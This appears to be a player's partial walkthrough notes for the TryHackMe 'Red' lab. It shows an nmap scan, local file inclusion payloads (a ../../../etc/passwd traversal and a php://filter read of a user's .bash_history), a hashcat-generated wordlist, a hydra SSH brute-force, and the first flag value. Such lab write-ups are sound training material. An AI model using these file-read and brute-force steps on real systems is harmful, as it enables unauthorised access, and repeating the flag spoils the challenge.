@@ -1,0 +1,132 @@
+Red -- Tryhackme -- Medium -- 23-Nov-2024 -- 1hr
+
+---- Recon
+
+Add red.thm in /etc/hosts -- Good Practice
+
+-- Nmap Scan
+
+┌──(kali㉿kali)-[~]
+└─$ nmap -A red.thm     
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-23 01:03 EST
+Nmap scan report for red.thm (10.10.126.99)
+Host is up (0.18s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e2:74:1c:e0:f7:86:4d:69:46:f6:5b:4d:be:c3:9f:76 (RSA)
+|   256 fb:84:73:da:6c:fe:b9:19:5a:6c:65:4d:d1:72:3b:b0 (ECDSA)
+|_  256 5e:37:75:fc:b3:64:e2:d8:d6:bc:9a:e6:7e:60:4d:3c (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-title: Atlanta - Free business bootstrap template
+|_Requested resource was /index.php?page=home.html
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 29.97 seconds
+
+-- Website : 80
+
+On observing port easily found LFI page=../../../etc/passwd
+Trying using PHP filters -- It worked
+
+http://red.thm/index.php?page=php://filter/resource=/home/blue/.bash_history
+
+echo "Red rules"
+cd
+hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
+cat passlist.txt
+rm passlist.txt
+sudo apt-get remove hashcat -y
+
+On seeing .reminder file found prefix
+
+                                                                                                                                                              
+┌──(kali㉿kali)-[~]
+└─$ echo 'sup3r_p@s$w0rd!' > .reminder
+                                                                                                                                                               
+┌──(kali㉿kali)-[~]
+└─$ hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
+                                                                                                                                                               
+┌──(kali㉿kali)-[~]
+└─$ head passlist.txt 
+sup3r_p@s$w0rd!
+!dr0w$s@p_r3pus
+SUP3R_P@S$W0RD!
+Sup3r_p@s$w0rd!
+sup3r_p@s$w0rd!0
+sup3r_p@s$w0rd!1
+sup3r_p@s$w0rd!2
+sup3r_p@s$w0rd!3
+sup3r_p@s$w0rd!4
+sup3r_p@s$w0rd!5
+                                                                                                                                                               
+┌──(kali㉿kali)-[~]
+└─$ hydra -l blue -P passlist.txt red.thm ssh     
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-23 01:18:27
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 77 login tries (l:1/p:77), ~5 tries per task
+[DATA] attacking ssh://red.thm:22/
+[22][ssh] host: red.thm   login: blue   password: sup3r_p@s$w0sup3r_p@s$w0
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-23 01:18:41
+
+First flag for user blue
+┌──(kali㉿kali)-[~]
+└─$ ssh blue@red.thm    
+The authenticity of host 'red.thm (10.10.126.99)' can't be established.
+ED25519 key fingerprint is SHA256:Jw5VYW4+TkPGUq5z4MEIujkfaV/jzH5rIHM6bxyug/Q.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'red.thm' (ED25519) to the list of known hosts.
+blue@red.thm's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-124-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat 23 Nov 2024 06:19:29 AM UTC
+
+  System load:  0.1               Processes:             134
+  Usage of /:   60.9% of 8.87GB   Users logged in:       0
+  Memory usage: 6%                IPv4 address for eth0: 10.10.126.99
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+61 updates can be applied immediately.
+6 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+6 updates could not be installed automatically. For more details,
+see /var/log/unattended-upgrades/unattended-upgrades.log
+
+Last login: Mon Apr 24 22:18:08 2023 from 10.13.4.71
+blue@red:~$ ls
+flag1
+blue@red:~$ cat flag1
+THM{Is_thAt_all_y0u_can_d0_blU3?}
+blue@red:~$ ls
+flag1
+blue@red:~$ cdSay Bye Bye to your Shell Blue and that password
+There is no way you are going to own this machine
+Connection to red.thm closed by remote host.
+Connection to red.thm closed.
+
+Here Twist -- May be cron job ssh password changed after some min and I logout then bruteforce again then login
+
+May be for established shell I want another user ssh
+
+Here 50 mins Over 1 flag complete out of 3 
